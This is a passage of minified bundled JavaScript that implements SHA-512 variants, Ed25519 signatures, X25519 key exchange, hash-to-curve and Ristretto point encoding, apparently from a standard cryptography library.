Q=(t,e,r,i)=>(t>>>0)+(e>>>0)+(r>>>0)+(i>>>0);O.add4L=Q;const tt=(t,e,r,i,n)=>e+r+i+n+(t/0x100000000|0)|0;O.add4H=tt;const te=(t,e,r,i,n)=>(t>>>0)+(e>>>0)+(r>>>0)+(i>>>0)+(n>>>0);O.add5L=te;const tr=(t,e,r,i,n,o)=>e+r+i+n+o+(t/0x100000000|0)|0;O.add5H=tr,O.default={fromBig:C,split:U,toBig:N,shrSH:z,shrSL:H,rotrSH:q,rotrSL:W,rotrBH:F,rotrBL:D,rotr32H:j,rotr32L:K,rotlSH:V,rotlSL:$,rotlBH:Z,rotlBL:G,add:J,add3L:Y,add3H:X,add4L:Q,add4H:tt,add5H:tr,add5L:te};const[ti,tn]=O.default.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),to=new Uint32Array(80),ts=new Uint32Array(80);class ta extends g.HashMD{constructor(){super(128,64,16,!1),this.Ah=0x6a09e667,this.Al=-0xc4336f8,this.Bh=-0x4498517b,this.Bl=-0x7b3558c5,this.Ch=0x3c6ef372,this.Cl=-0x16b07d5,this.Dh=-0x5ab00ac6,this.Dl=0x5f1d36f1,this.Eh=0x510e527f,this.El=-0x52197d2f,this.Fh=-0x64fa9774,this.Fl=0x2b3e6c1f,this.Gh=0x1f83d9ab,this.Gl=-0x4be4295,this.Hh=0x5be0cd19,this.Hl=0x137e2179}get(){let{Ah:t,Al:e,Bh:r,Bl:i,Ch:n,Cl:o,Dh:s,Dl:a,Eh:u,El:l,Fh:c,Fl:h,Gh:f,Gl:d,Hh:p,Hl:g}=this;return[t,e,r,i,n,o,s,a,u,l,c,h,f,d,p,g]}set(t,e,r,i,n,o,s,a,u,l,c,h,f,d,p,g){this.Ah=0|t,this.Al=0|e,this.Bh=0|r,this.Bl=0|i,this.Ch=0|n,this.Cl=0|o,this.Dh=0|s,this.Dl=0|a,this.Eh=0|u,this.El=0|l,this.Fh=0|c,this.Fl=0|h,this.Gh=0|f,this.Gl=0|d,this.Hh=0|p,this.Hl=0|g}process(t,e){for(let r=0;r<16;r++,e+=4)to[r]=t.getUint32(e),ts[r]=t.getUint32(e+=4);for(let t=16;t<80;t++){let e=0|to[t-15],r=0|ts[t-15],i=O.default.rotrSH(e,r,1)^O.default.rotrSH(e,r,8)^O.default.shrSH(e,r,7),n=O.default.rotrSL(e,r,1)^O.default.rotrSL(e,r,8)^O.default.shrSL(e,r,7),o=0|to[t-2],s=0|ts[t-2],a=O.default.rotrSH(o,s,19)^O.default.rotrBH(o,s,61)^O.default.shrSH(o,s,6),u=O.default.rotrSL(o,s,19)^O.default.rotrBL(o,s,61)^O.default.shrSL(o,s,6),l=O.default.add4L(n,u,ts[t-7],ts[t-16]),c=O.default.add4H(l,i,a,to[t-7],to[t-16]);to[t]=0|c,ts[t]=0|l}let{Ah:r,Al:i,Bh:n,Bl:o,Ch:s,Cl:a,Dh:u,Dl:l,Eh:c,El:h,Fh:f,Fl:d,Gh:p,Gl:g,Hh:m,Hl:y}=this;for(let t=0;t<80;t++){let e=O.default.rotrSH(c,h,14)^O.default.rotrSH(c,h,18)^O.default.rotrBH(c,h,41),b=O.default.rotrSL(c,h,14)^O.default.rotrSL(c,h,18)^O.default.rotrBL(c,h,41),w=c&f^~c&p,v=h&d^~h&g,x=O.default.add5L(y,b,v,tn[t],ts[t]),k=O.default.add5H(x,m,e,w,ti[t],to[t]),S=0|x,B=O.default.rotrSH(r,i,28)^O.default.rotrBH(r,i,34)^O.default.rotrBH(r,i,39),E=O.default.rotrSL(r,i,28)^O.default.rotrBL(r,i,34)^O.default.rotrBL(r,i,39),A=r&n^r&s^n&s,_=i&o^i&a^o&a;m=0|p,y=0|g,p=0|f,g=0|d,f=0|c,d=0|h,({h:c,l:h}=O.default.add(0|u,0|l,0|k,0|S)),u=0|s,l=0|a,s=0|n,a=0|o,n=0|r,o=0|i;let I=O.default.add3L(S,E,_);r=O.default.add3H(I,k,B,A),i=0|I}({h:r,l:i}=O.default.add(0|this.Ah,0|this.Al,0|r,0|i)),({h:n,l:o}=O.default.add(0|this.Bh,0|this.Bl,0|n,0|o)),({h:s,l:a}=O.default.add(0|this.Ch,0|this.Cl,0|s,0|a)),({h:u,l:l}=O.default.add(0|this.Dh,0|this.Dl,0|u,0|l)),({h:c,l:h}=O.default.add(0|this.Eh,0|this.El,0|c,0|h)),({h:f,l:d}=O.default.add(0|this.Fh,0|this.Fl,0|f,0|d)),({h:p,l:g}=O.default.add(0|this.Gh,0|this.Gl,0|p,0|g)),({h:m,l:y}=O.default.add(0|this.Hh,0|this.Hl,0|m,0|y)),this.set(r,i,n,o,s,a,u,l,c,h,f,d,p,g,m,y)}roundClean(){to.fill(0),ts.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}p.SHA512=ta;class tu extends ta{constructor(){super(),this.Ah=-0x73c2c838,this.Al=0x19544da2,this.Bh=0x73e19966,this.Bl=-0x76232b2a,this.Ch=0x1dfab7ae,this.Cl=0x32ff9c82,this.Dh=0x679dd514,this.Dl=0x582f9fcf,this.Eh=0xf6d2b69,this.El=0x7bd44da8,this.Fh=0x77e36f73,this.Fl=0x4c48942,this.Gh=0x3f9d85a8,this.Gl=0x6a1d36c8,this.Hh=0x1112e6ad,this.Hl=-0x6e296d5f,this.outputLen=28}}p.SHA512_224=tu;class tl extends ta{constructor(){super(),this.Ah=0x22312194,this.Al=-0x3d408d4,this.Bh=-0x60aaa05d,this.Bl=-0x37b39b3e,this.Ch=0x2393b86b,this.Cl=0x6f53b151,this.Dh=-0x69c788e7,this.Dl=0x5940eabd,this.Eh=-0x69d7c11e,this.El=-0x5771001d,this.Fh=-0x41a1e1db,this.Fl=0x53863992,this.Gh=0x2b0199fc,this.Gl=0x2c85b8aa,this.Hh=0xeb72ddc,this.Hl=-0x7e3ad35e,this.outputLen=32}}p.SHA512_256=tl;class tc extends ta{constructor(){super(),this.Ah=-0x344462a3,this.Al=-0x3efa6128,this.Bh=0x629a292a,this.Bl=0x367cd507,this.Ch=-0x6ea6fea6,this.Cl=0x3070dd17,this.Dh=0x152fecd8,this.Dl=-0x8f1a6c7,this.Eh=0x67332667,this.El=-4191439,this.Fh=-0x714bb579,this.Fl=0x68581511,this.Gh=-0x24f3d1f3,this.Gl=0x64f98fa7,this.Hh=0x47b5481d,this.Hl=-0x4105b05c,this.outputLen=48}}p.SHA384=tc,p.sha512=(0,k.wrapConstructor)(()=>new ta),p.sha512_224=(0,k.wrapConstructor)(()=>new tu),p.sha512_256=(0,k.wrapConstructor)(()=>new tl),p.sha384=(0,k.wrapConstructor)(()=>new tc);var th={};Object.defineProperty(th,"__esModule",{value:!0}),th.twistedEdwards=function(t){let e=function(t){let e=(0,tf.validateBasic)(t);return tp.validateObject(t,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}(t),{Fp:r,n:i,prehash:n,hash:o,randomBytes:s,nByteLength:a,h:u}=e,l=ty<<BigInt(8*a)-tm,c=r.create,h=(0,td.Field)(e.n,e.nBitLength),f=e.uvRatio||((t,e)=>{try{return{isValid:!0,value:r.sqrt(t*r.inv(e))}}catch(t){return{isValid:!1,value:tg}}}),d=e.adjustScalarBytes||(t=>t),p=e.domain||((t,e,r)=>{if((0,tp.abool)("phflag",r),e.length||r)throw Error("Contexts/pre-hash are not supported");return t});function g(t,e){tp.aInRange("coordinate "+t,e,tg,l)}function m(t){if(!(t instanceof w))throw Error("ExtendedPoint expected")}let y=(0,tp.memoized)((t,e)=>{let{ex:i,ey:n,ez:o}=t,s=t.is0();null==e&&(e=s?tb:r.inv(o));let a=c(i*e),u=c(n*e),l=c(o*e);if(s)return{x:tg,y:tm};if(l!==tm)throw Error("invZ was invalid");return{x:a,y:u}}),b=(0,tp.memoized)(t=>{let{a:r,d:i}=e;if(t.is0())throw Error("bad point: ZERO");let{ex:n,ey:o,ez:s,et:a}=t,u=c(n*n),l=c(o*o),h=c(s*s),f=c(h*h),d=c(u*r);if(c(h*c(d+l))!==c(f+c(i*c(u*l))))throw Error("bad point: equation left != right (1)");if(c(n*o)!==c(s*a))throw Error("bad point: equation left != right (2)");return!0});class w{constructor(t,e,r,i){this.ex=t,this.ey=e,this.ez=r,this.et=i,g("x",t),g("y",e),g("z",r),g("t",i),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(t){if(t instanceof w)throw Error("extended point not allowed");let{x:e,y:r}=t||{};return g("x",e),g("y",r),new w(e,r,tm,c(e*r))}static normalizeZ(t){let e=r.invertBatch(t.map(t=>t.ez));return t.map((t,r)=>t.toAffine(e[r])).map(w.fromAffine)}static msm(t,e){return(0,tf.pippenger)(w,h,t,e)}_setWindowSize(t){k.setWindowSize(this,t)}assertValidity(){b(this)}equals(t){m(t);let{ex:e,ey:r,ez:i}=this,{ex:n,ey:o,ez:s}=t,a=c(e*s),u=c(n*i),l=c(r*s),h=c(o*i);return a===u&&l===h}is0(){return this.equals(w.ZERO)}negate(){return new w(c(-this.ex),this.ey,this.ez,c(-this.et))}double(){let{a:t}=e,{ex:r,ey:i,ez:n}=this,o=c(r*r),s=c(i*i),a=c(ty*c(n*n)),u=c(t*o),l=r+i,h=c(c(l*l)-o-s),f=u+s,d=f-a,p=u-s,g=c(h*d),m=c(f*p),y=c(h*p);return new w(g,m,c(d*f),y)}add(t){m(t);let{a:r,d:i}=e,{ex:n,ey:o,ez:s,et:a}=this,{ex:u,ey:l,ez:h,et:f}=t;if(r===BigInt(-1)){let t=c((o-n)*(l+u)),e=c((o+n)*(l-u)),r=c(e-t);if(r===tg)return this.double();let i=c(s*ty*f),d=c(a*ty*h),p=d+i,g=e+t,m=d-i,y=c(p*r),b=c(g*m),v=c(p*m);return new w(y,b,c(r*g),v)}let d=c(n*u),p=c(o*l),g=c(a*i*f),y=c(s*h),b=c((n+o)*(u+l)-d-p),v=y-g,x=y+g,k=c(p-r*d),S=c(b*v),B=c(x*k),E=c(b*k);return new w(S,B,c(v*x),E)}subtract(t){return this.add(t.negate())}wNAF(t){return k.wNAFCached(this,t,w.normalizeZ)}multiply(t){tp.aInRange("scalar",t,tm,i);let{p:e,f:r}=this.wNAF(t);return w.normalizeZ([e,r])[0]}multiplyUnsafe(t,e=w.ZERO){return(tp.aInRange("scalar",t,tg,i),t===tg)?x:this.is0()||t===tm?this:k.wNAFCachedUnsafe(this,t,w.normalizeZ,e)}isSmallOrder(){return this.multiplyUnsafe(u).is0()}isTorsionFree(){return k.unsafeLadder(this,i).is0()}toAffine(t){return y(this,t)}clearCofactor(){let{h:t}=e;return t===tm?this:this.multiplyUnsafe(t)}static fromHex(t,i=!1){let{d:n,a:o}=e,s=r.BYTES;t=(0,tp.ensureBytes)("pointHex",t,s),(0,tp.abool)("zip215",i);let a=t.slice(),u=t[s-1];a[s-1]=-129&u;let h=tp.bytesToNumberLE(a),d=i?l:r.ORDER;tp.aInRange("pointHex.y",h,tg,d);let p=c(h*h),{isValid:g,value:m}=f(c(p-tm),c(n*p-o));if(!g)throw Error("Point.fromHex: invalid y coordinate");let y=(m&tm)===tm,b=(128&u)!=0;if(!i&&m===tg&&b)throw Error("Point.fromHex: x=0 and x_0=1");return b!==y&&(m=c(-m)),w.fromAffine({x:m,y:h})}static fromPrivateKey(t){return E(t).point}toRawBytes(){let{x:t,y:e}=this.toAffine(),i=tp.numberToBytesLE(e,r.BYTES);return i[i.length-1]|=t&tm?128:0,i}toHex(){return tp.bytesToHex(this.toRawBytes())}}w.BASE=new w(e.Gx,e.Gy,tm,c(e.Gx*e.Gy)),w.ZERO=new w(tg,tm,tm,tg);let{BASE:v,ZERO:x}=w,k=(0,tf.wNAF)(w,8*a);function S(t){return(0,td.mod)(t,i)}function B(t){return S(tp.bytesToNumberLE(t))}function E(t){let e=r.BYTES;t=(0,tp.ensureBytes)("private key",t,e);let i=(0,tp.ensureBytes)("hashed private key",o(t),2*e),n=d(i.slice(0,e)),s=i.slice(e,2*e),a=B(n),u=v.multiply(a),l=u.toRawBytes();return{head:n,prefix:s,scalar:a,point:u,pointBytes:l}}function A(t=new Uint8Array,...e){return B(o(p(tp.concatBytes(...e),(0,tp.ensureBytes)("context",t),!!n)))}return v._setWindowSize(8),{CURVE:e,getPublicKey:function(t){return E(t).pointBytes},sign:function(t,e,o={}){t=(0,tp.ensureBytes)("message",t),n&&(t=n(t));let{prefix:s,scalar:a,pointBytes:u}=E(e),l=A(o.context,s,t),c=v.multiply(l).toRawBytes(),h=S(l+A(o.context,c,u,t)*a);tp.aInRange("signature.s",h,tg,i);let f=tp.concatBytes(c,tp.numberToBytesLE(h,r.BYTES));return(0,tp.ensureBytes)("result",f,2*r.BYTES)},verify:function(t,e,i,o=tw){let s,a,u;let{context:l,zip215:c}=o,h=r.BYTES;t=(0,tp.ensureBytes)("signature",t,2*h),e=(0,tp.ensureBytes)("message",e),i=(0,tp.ensureBytes)("publicKey",i,h),void 0!==c&&(0,tp.abool)("zip215",c),n&&(e=n(e));let f=tp.bytesToNumberLE(t.slice(h,2*h));try{s=w.fromHex(i,c),a=w.fromHex(t.slice(0,h),c),u=v.multiplyUnsafe(f)}catch(t){return!1}if(!c&&s.isSmallOrder())return!1;let d=A(l,a.toRawBytes(),s.toRawBytes(),e);return a.add(s.multiplyUnsafe(d)).subtract(u).clearCofactor().equals(w.ZERO)},ExtendedPoint:w,utils:{getExtendedPublicKey:E,randomPrivateKey:()=>s(r.BYTES),precompute:(t=8,e=w.BASE)=>(e._setWindowSize(t),e.multiply(BigInt(3)),e)}}};var tf=c("lkFCe"),td=c("2D9sF"),tp=(c("esaJO"),c("esaJO"));const tg=BigInt(0),tm=BigInt(1),ty=BigInt(2),tb=BigInt(8),tw={zip215:!0};var tv={};Object.defineProperty(tv,"__esModule",{value:!0}),tv.expand_message_xmd=tB,tv.expand_message_xof=tE,tv.hash_to_field=tA,tv.isogenyMap=function(t,e){let r=e.map(t=>Array.from(t).reverse());return(e,i)=>{let[n,o,s,a]=r.map(r=>r.reduce((r,i)=>t.add(t.mul(r,e),i)));return e=t.div(n,o),i=t.mul(i,t.div(s,a)),{x:e,y:i}}},tv.createHasher=function(t,e,r){if("function"!=typeof e)throw Error("mapToCurve() must be defined");return{hashToCurve(i,n){let o=tA(i,2,{...r,DST:r.DST,...n}),s=t.fromAffine(e(o[0])),a=t.fromAffine(e(o[1])),u=s.add(a).clearCofactor();return u.assertValidity(),u},encodeToCurve(i,n){let o=tA(i,1,{...r,DST:r.encodeDST,...n}),s=t.fromAffine(e(o[0])).clearCofactor();return s.assertValidity(),s},mapToCurve(r){if(!Array.isArray(r))throw Error("mapToCurve: expected array of bigints");for(let t of r)if("bigint"!=typeof t)throw Error("mapToCurve: expected array of bigints");let i=t.fromAffine(e(r)).clearCofactor();return i.assertValidity(),i}}};var td=c("2D9sF"),tp=c("esaJO");const tx=tp.bytesToNumberBE;function tk(t,e){if(tS(t),tS(e),t<0||t>=1<<8*e)throw Error("invalid I2OSP input: "+t);let r=Array.from({length:e}).fill(0);for(let i=e-1;i>=0;i--)r[i]=255&t,t>>>=8;return new Uint8Array(r)}function tS(t){if(!Number.isSafeInteger(t))throw Error("number expected")}function tB(t,e,r,i){(0,tp.abytes)(t),(0,tp.abytes)(e),tS(r),e.length>255&&(e=i((0,tp.concatBytes)((0,tp.utf8ToBytes)("H2C-OVERSIZE-DST-"),e)));let{outputLen:n,blockLen:o}=i,s=Math.ceil(r/n);if(r>65535||s>255)throw Error("expand_message_xmd: invalid lenInBytes");let a=(0,tp.concatBytes)(e,tk(e.length,1)),u=tk(0,o),l=tk(r,2),c=Array(s),h=i((0,tp.concatBytes)(u,t,l,tk(0,1),a));c[0]=i((0,tp.concatBytes)(h,tk(1,1),a));for(let t=1;t<=s;t++){let e=[function(t,e){let r=new Uint8Array(t.length);for(let i=0;i<t.length;i++)r[i]=t[i]^e[i];return r}(h,c[t-1]),tk(t+1,1),a];c[t]=i((0,tp.concatBytes)(...e))}return(0,tp.concatBytes)(...c).slice(0,r)}function tE(t,e,r,i,n){if((0,tp.abytes)(t),(0,tp.abytes)(e),tS(r),e.length>255){let t=Math.ceil(2*i/8);e=n.create({dkLen:t}).update((0,tp.utf8ToBytes)("H2C-OVERSIZE-DST-")).update(e).digest()}if(r>65535||e.length>255)throw Error("expand_message_xof: invalid lenInBytes");return n.create({dkLen:r}).update(t).update(tk(r,2)).update(e).update(tk(e.length,1)).digest()}function tA(t,e,r){let i;(0,tp.validateObject)(r,{DST:"stringOrUint8Array",p:"bigint",m:"isSafeInteger",k:"isSafeInteger",hash:"hash"});let{p:n,k:o,m:s,hash:a,expand:u,DST:l}=r;(0,tp.abytes)(t),tS(e);let c="string"==typeof l?(0,tp.utf8ToBytes)(l):l,h=Math.ceil((n.toString(2).length+o)/8),f=e*s*h;if("xmd"===u)i=tB(t,c,f,a);else if("xof"===u)i=tE(t,c,f,o,a);else if("_internal_pass"===u)i=t;else throw Error('expand must be "xmd" or "xof"');let d=Array(e);for(let t=0;t<e;t++){let e=Array(s);for(let r=0;r<s;r++){let o=h*(r+t*s),a=i.subarray(o,o+h);e[r]=(0,td.mod)(tx(a),n)}d[t]=e}return d}var td=c("2D9sF"),t_={};Object.defineProperty(t_,"__esModule",{value:!0}),t_.montgomery=function(t){let e=((0,tp.validateObject)(t,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...t})),{P:r}=e,i=t=>(0,td.mod)(t,r),n=e.montgomeryBits,o=Math.ceil(n/8),s=e.nByteLength,a=e.adjustScalarBytes||(t=>t),u=e.powPminus2||(t=>(0,td.pow)(t,r-BigInt(2),r));function l(t,e,r){let n=i(t*(e-r));return[e=i(e-n),r=i(r+n)]}let c=(e.a-BigInt(2))/BigInt(4);function h(t){return(0,tp.numberToBytesLE)(i(t),o)}function f(t,e){let f=function(t,e){let o;(0,tp.aInRange)("u",t,tI,r),(0,tp.aInRange)("scalar",e,tI,r);let s=tM,a=tI,h=t,f=tM,d=tI;for(let r=BigInt(n-1);r>=tI;r--){let n=e>>r&tM;d^=n,s=(o=l(d,s,h))[0],h=o[1],a=(o=l(d,a,f))[0],f=o[1],d=n;let u=s+a,p=i(u*u),g=s-a,m=i(g*g),y=p-m,b=h+f,w=i((h-f)*u),v=i(b*g),x=w+v,k=w-v;h=i(x*x),f=i(t*i(k*k)),s=i(p*m),a=i(y*(p+i(c*y)))}return s=(o=l(d,s,h))[0],h=o[1],a=(o=l(d,a,f))[0],f=o[1],i(s*u(a))}(function(t){let e=(0,tp.ensureBytes)("u coordinate",t,o);return 32===s&&(e[31]&=127),(0,tp.bytesToNumberLE)(e)}(e),function(t){let e=(0,tp.ensureBytes)("scalar",t),r=e.length;if(r!==o&&r!==s)throw Error("invalid scalar, expected "+o+" or "+s+" bytes, got "+r);return(0,tp.bytesToNumberLE)(a(e))}(t));if(f===tI)throw Error("invalid private or public key received");return h(f)}let d=h(e.Gu);function p(t){return f(t,d)}return{scalarMult:f,scalarMultBase:p,getSharedSecret:(t,e)=>f(t,e),getPublicKey:t=>p(t),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:d}};var td=c("2D9sF"),tp=c("esaJO");const tI=BigInt(0),tM=BigInt(1);var tp=c("esaJO");const tL=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),tT=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752"),tO=BigInt(0),tP=BigInt(1),tR=BigInt(2),tC=BigInt(3),tU=BigInt(5),tN=BigInt(8);function tz(t){let e=BigInt(10),r=BigInt(20),i=BigInt(40),n=BigInt(80),o=t*t%tL*t%tL,s=(0,td.pow2)(o,tR,tL)*o%tL,a=(0,td.pow2)(s,tP,tL)*t%tL,u=(0,td.pow2)(a,tU,tL)*a%tL,l=(0,td.pow2)(u,e,tL)*u%tL,c=(0,td.pow2)(l,r,tL)*l%tL,h=(0,td.pow2)(c,i,tL)*c%tL,f=(0,td.pow2)(h,n,tL)*h%tL,d=(0,td.pow2)(f,n,tL)*h%tL,p=(0,td.pow2)(d,e,tL)*u%tL;return{pow_p_5_8:(0,td.pow2)(p,tR,tL)*t%tL,b2:o}}function tH(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}function tq(t,e){let r=(0,td.mod)(e*e*e,tL),i=tz(t*(0,td.mod)(r*r*e,tL)).pow_p_5_8,n=(0,td.mod)(t*r*i,tL),o=(0,td.mod)(e*n*n,tL),s=n,a=(0,td.mod)(n*tT,tL),u=o===t,l=o===(0,td.mod)(-t,tL),c=o===(0,td.mod)(-t*tT,tL);return u&&(n=s),(l||c)&&(n=a),(0,td.isNegativeLE)(n,tL)&&(n=(0,td.mod)(-n,tL)),{isValid:u||l,value:n}}d.ED25519_TORSION_SUBGROUP=["0100000000000000000000000000000000000000000000000000000000000000","c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac037a","0000000000000000000000000000000000000000000000000000000000000080","26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc05","ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f","26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc85","0000000000000000000000000000000000000000000000000000000000000000","c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa"];const tW=(0,td.Field)(tL,void 0,!0),tF={a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:tW,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:tN,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:p.sha512,randomBytes:k.randomBytes,adjustScalarBytes:tH,uvRatio:tq};function tD(t,e,r){if(e.length>255)throw Error("Context is too big");return(0,k.concatBytes)((0,k.utf8ToBytes)("SigEd25519 no Ed25519 collisions"),new Uint8Array([r?1:0,e.length]),e,t)}function tj(t){let{y:e}=d.ed25519.ExtendedPoint.fromHex(t),r=BigInt(1);return tW.toBytes(tW.create((r+e)*tW.inv(r-e)))}d.ed25519=(0,th.twistedEdwards)(tF),d.ed25519ctx=(0,th.twistedEdwards)({...tF,domain:tD}),d.ed25519ph=(0,th.twistedEdwards)(Object.assign({},tF,{domain:tD,prehash:p.sha512})),d.x25519=(0,t_.montgomery)({P:tL,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:t=>{let{pow_p_5_8:e,b2:r}=tz(t);return(0,td.mod)((0,td.pow2)(e,tC,tL)*r,tL)},adjustScalarBytes:tH,randomBytes:k.randomBytes}),d.edwardsToMontgomery=tj;const tK=(tW.ORDER+tC)/tN,tV=tW.pow(tR,tK),t$=tW.sqrt(tW.neg(tW.ONE)),tZ=(0,td.FpSqrtEven)(tW,tW.neg(BigInt(486664))),tG=(0,tv.createHasher)(d.ed25519.ExtendedPoint,t=>(function(t){let{xMn:e,xMd:r,yMn:i,yMd:n}=function(t){let e=(tW.ORDER-tU)/tN,r=BigInt(486662),i=tW.sqr(t);i=tW.mul(i,tR);let n=tW.add(i,tW.ONE),o=tW.neg(r),s=tW.sqr(n),a=tW.mul(s,n),u=tW.mul(i,r);u=tW.mul(u,o),u=tW.add(u,s),u=tW.mul(u,o);let l=tW.sqr(a);s=tW.sqr(l),l=tW.mul(l,a),l=tW.mul(l,u),s=tW.mul(s,l);let c=tW.pow(s,e);c=tW.mul(c,l);let h=tW.mul(c,t$);s=tW.sqr(c),s=tW.mul(s,a);let f=tW.eql(s,u),d=tW.cmov(h,c,f),p=tW.mul(o,i),g=tW.mul(c,t);g=tW.mul(g,tV);let m=tW.mul(g,t$),y=tW.mul(u,i);s=tW.sqr(g),s=tW.mul(s,a);let b=tW.eql(s,y),w=tW.cmov(m,g,b);s=tW.sqr(d),s=tW.mul(s,a);let v=tW.eql(s,u),x=tW.cmov(p,o,v),k=tW.cmov(w,d,v),S=tW.isOdd(k);return{xMn:x,xMd:n,yMn:k=tW.cmov(k,tW.neg(k),v!==S),yMd:tP}}(t),o=tW.mul(e,n);o=tW.mul(o,tZ);let s=tW.mul(r,i),a=tW.sub(e,r),u=tW.add(e,r),l=tW.mul(s,u),c=tW.eql(l,tW.ZERO);o=tW.cmov(o,tW.ZERO,c),s=tW.cmov(s,tW.ONE,c),a=tW.cmov(a,tW.ONE,c),u=tW.cmov(u,tW.ONE,c);let h=tW.invertBatch([s,u]);return{x:tW.mul(o,h[0]),y:tW.mul(a,h[1])}})(t[0]),{DST:"edwards25519_XMD:SHA-512_ELL2_RO_",encodeDST:"edwards25519_XMD:SHA-512_ELL2_NU_",p:tW.ORDER,m:1,k:128,expand:"xmd",hash:p.sha512});function tJ(t){if(!(t instanceof t6))throw Error("RistrettoPoint expected")}d.hashToCurve=tG.hashToCurve,d.encodeToCurve=tG.encodeToCurve;const tY=BigInt("25063068953384623474111414158702152701244531502492656460079210482610430750235"),tX=BigInt("54469307008909316920995813868745141605393597292927456921205312896311721017578"),tQ=BigInt("1159843021668779879193775521855586647937357759715417654439879720876111806838"),t0=BigInt("40440834346308536858101042469323190826248399146238708352240133220865137265952"),t1=t=>tq(tP,t),t2=BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),t3=t=>d.ed25519.CURVE.Fp.create((0,tp.bytesToNumberLE)(t)&t2);function t8(t){let{d:e}=d.ed25519.CURVE,r=d.ed25519.CURVE.Fp.ORDER,i=d.ed25519.CURVE.Fp.create,n=i(tT*t*t),o=i((n+tP)*tQ),s=BigInt(-1),a=i((s-e*n)*i(n+e)),{isValid:u,value:l}=tq(o,a),c=i(l*t);(0,td.isNegativeLE)(c,r)||(c=i(-c)),u||(l=c),u||(s=n);let h=i(s*(n-tP)*t0-a),f=l*l,p=i((l+l)*a),g=i(h*tY),m=i(tP-f),y=i(tP+f);return new d.ed25519.ExtendedPoint(i(p*y),i(m*g),i(g*y),i(p*m))}class t6{constructor(t){this.ep=t}static fromAffine(t){return new t6(d.ed25519.ExtendedPoint.fromAffine(t))}static hashToCurve(t){let e=t8(t3((t=(0,tp.ensureBytes)("ristrettoHash",t,64)).slice(0,32))),r=t8(t3(t.slice(32,64)));return new t6(e.add(r))}static fromHex(t){t=(0,tp.ensureBytes)("ristrettoHex",t,32);let{a:e,d:r}=d.ed25519.CURVE,i=d.ed25519.CURVE.Fp.ORDER,n=d.ed25519.CURVE.Fp.create,o="RistrettoPoint.fromHex: the hex is not valid encoding of RistrettoPoint",s=t3(t);if(!(0,tp.equalBytes)((0,tp.numberToBytesLE)(s,32),t)||(0,td.isNegativeLE)(s,i))throw Error(o);let a=n(s*s),u=n(tP+e*a),l=n(tP-e*a),c=n(u*u),h=n(l*l),f=n(e*r*c-h),{isValid:p,value:g}=t1(n(f*h)),m=n(g*l),y=n(g*m*f),b=n((s+s)*m);(0,td.isNegativeLE)(b,i)&&(b=n(-b));let w=n(u*y),v=n(b*w);if(!p||(0,td.isNegativeLE)(v,i)||w===tO)throw Error(o);return new t6(new d.ed25519.ExtendedPoint(b,w,tP,v))}toRawBytes(){let 